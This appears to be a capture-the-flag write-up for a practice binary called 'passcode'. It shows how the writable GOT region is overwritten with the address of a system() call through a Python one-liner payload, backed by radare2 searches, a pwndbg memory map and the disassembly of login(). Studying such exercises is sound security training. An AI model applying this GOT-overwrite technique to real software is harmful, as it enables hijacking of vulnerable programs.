# `passcode` Solution

First find a Read+Write memory in the process that is not affected by ASLR.
I found the beginning of the GOT table:

    0x804a000  0x804b000 rw-p     1000 1000   ./passcode

I than rewrite the beginning of it with the address inside the IF statement with
the execution of flag listing:

    0x080485d7 <+115>:   mov    DWORD PTR [esp],0x80487a5
    0x080485de <+122>:   call   0x8048450 <puts@plt>
    0x080485e3 <+127>:   mov    DWORD PTR [esp],0x80487af
    0x080485ea <+134>:   call   0x8048460 <system@plt>
    0x080485ef <+139>:   leave
    0x080485f0 <+140>:   ret

Finally I get:

    python -c "import struct;print 'a'*96+struct.pack('<I',0x804a000);print '%i'%0x080485d7;print 13371337" | ./passcode

# Notes

    python -c "print 'a'*100; print 0; print 0" | ./passcode

    python -c 'import string;print (lambda l, b: "".join([string.ascii_letters[i%len(string.ascii_letters)]* b for i in range(l/b)]))(100, 4);print 0;print 0' | ./passcode

From radare2:

    /v 338150
    ...
    0x080485c8 hit1_0 e6280500
    /v 13371337
    ...
    0x080485d1 hit2_0 c907cc00


From gdb:

    pwndbg> vmmap
    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
     0x8048000  0x804a000 r-xp     2000 0      ./passcode
     0x804a000  0x804b000 rw-p     1000 1000   ./passcode    !!!
     ...


From gdb:

    pwndbg> disassemble login
    Dump of assembler code for function login:
       0x08048564 <+0>: push   ebp
       0x08048565 <+1>: mov    ebp,esp
       0x08048567 <+3>: sub    esp,0x28
       0x0804856a <+6>: mov    eax,0x8048770
       0x0804856f <+11>:    mov    DWORD PTR [esp],eax
       0x08048572 <+14>:    call   0x8048420 <printf@plt>
       0x08048577 <+19>:    mov    eax,0x8048783
       0x0804857c <+24>:    mov    edx,DWORD PTR [ebp-0x10]
       0x0804857f <+27>:    mov    DWORD PTR [esp+0x4],edx
       0x08048583 <+31>:    mov    DWORD PTR [esp],eax
       0x08048586 <+34>:    call   0x80484a0 <__isoc99_scanf@plt>
       0x0804858b <+39>:    mov    eax,ds:0x804a02c
       0x08048590 <+44>:    mov    DWORD PTR [esp],eax
       0x08048593 <+47>:    call   0x8048430 <fflush@plt>
       0x08048598 <+52>:    mov    eax,0x8048786
       0x0804859d <+57>:    mov    DWORD PTR [esp],eax
       0x080485a0 <+60>:    call   0x8048420 <printf@plt>
    => 0x080485a5 <+65>:    mov    eax,0x8048783
       0x080485aa <+70>:    mov    edx,DWORD PTR [ebp-0xc]
       0x080485ad <+73>:    mov    DWORD PTR [esp+0x4],edx
       0x080485b1 <+77>:    mov    DWORD PTR [esp],eax
       0x080485b4 <+80>:    call   0x80484a0 <__isoc99_scanf@plt>
       0x080485b9 <+85>:    mov    DWORD PTR [esp],0x8048799
       0x080485c0 <+92>:    call   0x8048450 <puts@plt>
       0x080485c5 <+97>:    cmp    DWORD PTR [ebp-0x10],0x528e6
       0x080485cc <+104>:   jne    0x80485f1 <login+141>
       0x080485ce <+106>:   cmp    DWORD PTR [ebp-0xc],0xcc07c9
       0x080485d5 <+113>:   jne    0x80485f1 <login+141>
       0x080485d7 <+115>:   mov    DWORD PTR [esp],0x80487a5
       0x080485de <+122>:   call   0x8048450 <puts@plt>
       0x080485e3 <+127>:   mov    DWORD PTR [esp],0x80487af
       0x080485ea <+134>:   call   0x8048460 <system@plt>
       0x080485ef <+139>:   leave
       0x080485f0 <+140>:   ret
       0x080485f1 <+141>:   mov    DWORD PTR [esp],0x80487bd
       0x080485f8 <+148>:   call   0x8048450 <puts@plt>
       0x080485fd <+153>:   mov    DWORD PTR [esp],0x0
       0x08048604 <+160>:   call   0x8048480 <exit@plt>
